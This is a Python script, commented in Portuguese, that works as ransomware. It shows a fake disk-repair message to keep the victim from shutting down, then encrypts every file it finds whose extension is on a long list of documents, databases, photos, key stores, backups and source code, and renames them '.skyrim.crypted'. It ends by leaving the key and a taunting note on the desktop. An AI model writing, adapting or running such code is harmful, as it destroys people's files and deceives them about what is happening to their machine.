import os, subprocess, platform
from time import time
from base64 import b64encode
from random import randint

from Crypto.Random import get_random_bytes  # gera chave aleatória

from lib.cryptor import find_root_paths, find_files_and_do

JOKER = 'skyrim'
# extensões para arquivo criptografado
CUSTOM_EXT = '.skyrim.crypted'
# nomes de arquivo para mensagem da área de trabalho e chave de descriptografia. Defina false para não criar 
MSG_FILE = 'arrependimento.txt'
KEY_FILE = 'key'
# Mensagem para escrever no arquivo da área de trabalho
MSG = '\nA chave está no Desktop. {} em algum lugar.\n'.format(JOKER)
# Extensões a serem encriptografadas 
EXTENSIONS = ['.wb2', '.psd', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt','.cer', '.der', '.pl', '.py', '.lua',
              '.css', '.js', '.asp', '.php', '.incpas', '.asm', '.hpp', '.h', '.cpp', '.c', '.7z', '.zip', '.rar',
              '.drf', '.blend', '.apj', '.3ds', '.dwg', '.sda', '.ps', '.pat', '.fxg', '.fhd', '.fh', '.dxb',
              '.drw', '.design', '.ddrw', '.ddoc', '.dcs', '.csl', '.csh', '.cpi', '.cgm', '.cdx', '.cdrw', '.cdr6',
              '.cdr5', '.cdr4', '.cdr3', '.cdr', '.awg', '.ait', '.ai', '.agd1', '.ycbcra', '.x3f', '.stx', '.st8',
              '.st7', '.st6', '.st5', '.st4', '.srw', '.srf', '.sr2', '.sd1', '.sd0', '.rwz', '.rwl', '.rw2', '.raw',
              '.raf', '.ra2', '.ptx', '.pef', '.pcd', '.orf', '.nwb', '.nrw', '.nop', '.nef', '.ndd', '.mrw', '.mos',
              '.mfw', '.mef', '.mdc', '.kdc', '.kc2', '.iiq', '.gry', '.grey', '.gray', '.fpx', '.fff', '.exf', '.erf',
              '.dng', '.dcr', '.dc2', '.crw', '.craw', '.cr2', '.cmt', '.cib', '.ce2', '.ce1', '.arw', '.3pr', '.3fr',
              '.mpg', '.jpeg', '.jpg', '.mdb', '.sqlitedb', '.sqlite3', '.sqlite', '.sql', '.sdf', '.sav', '.sas7bdat',
              '.s3db', '.rdb', '.psafe3', '.nyf', '.nx2', '.nx1', '.nsh', '.nsg', '.nsf', '.nsd', '.ns4', '.ns3', '.ns2',
              '.myd', '.kpdx', '.kdbx', '.idx', '.ibz', '.ibd', '.fdb', '.erbsql', '.db3', '.dbf', '.db-journal', '.db',
              '.cls', '.bdb', '.al', '.adb', '.backupdb', '.bik', '.backup', '.bak', '.bkp', '.moneywell', '.mmw',
              '.ibank', '.hbk', '.ffd', '.dgc', '.ddd', '.dac', '.cfp', '.cdf', '.bpw', '.bgt', '.acr', '.ac2', '.ab4',
              '.djvu', '.pdf', '.sxm', '.odf', '.std', '.sxd', '.otg', '.sti', '.sxi', '.otp', '.odg', '.odp', '.stc',
              '.sxc', '.ots', '.ods', '.sxg', '.stw', '.sxw', '.odm', '.oth', '.ott', '.odt', '.odb', '.csv', '.rtf',
              '.accdr', '.accdt', '.accde', '.accdb', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.potm', '.potx',
              '.pptm', '.pptx', '.pps', '.pot', '.ppt', '.xlw', '.xll', '.xlam', '.xla', '.xlsb', '.xltm', '.xltx',
              '.xlsm', '.xlsx', '.xlm', '.xlt', '.xls', '.xml', '.dotm', '.dotx', '.docm', '.docx', '.dot', '.doc', '.txt']

########################################################################################################################

def fake_checkdisk():
    print(u'{} has detected uncleared nodes'.format(platform.system()))
    print(u'Starting testdisk tool, please don\'t shutdown your computer')
    print(u'{} disk errors found. Trying to repair disk...'.format(randint(2, 5)))

def just_kidding(key_enc, msg):
    if not (MSG_FILE and KEY_FILE):
        return False
    desktop_path = ''
    if os.name == 'nt':
        desktop_path = os.path.expanduser('~/Desktop/')
    elif os.name == 'posix':
        desktop_path = subprocess.check_output(['xdg-user-dir', 'DESKTOP']).rstrip('\n')
    if KEY_FILE:
        # escrevendo chave num arquivo na área de trabalho
        key_file = os.path.join(desktop_path, KEY_FILE)
        with open(key_file, 'wb+') as f_key:
            f_key.write(key_enc)
    if MSG_FILE:
        # escrevndo mensagem .txt na área de trabalho
        msg_file = os.path.join(desktop_path, MSG_FILE)
        with open(msg_file, 'wb+') as f_msg:
            f_msg.write(msg)



################################################################################
# SCRIPT-WORKFLOW
################################################################################
def main():
    init_time = time()
    fake_checkdisk()
    root_paths = find_root_paths()
    key = get_random_bytes(32)  # gerando chave aleatória 
    #encriptando arquivos
    files_crypted = find_files_and_do(root_paths, EXTENSIONS, key, action='encrypt',crypted_ext=CUSTOM_EXT)
    
    # calculando tempo de encriptação, escrevendo mensagem final e salvando chave.
    end_time = time()
    execution_time = end_time - init_time
    msg = '{} files have been encrypted in {} seconds.{}'.format(str(len(files_crypted)), str(end_time), MSG)
    key_enc = b64encode(key)
    just_kidding(key_enc, msg)


if __name__ == '__main__':
    main()
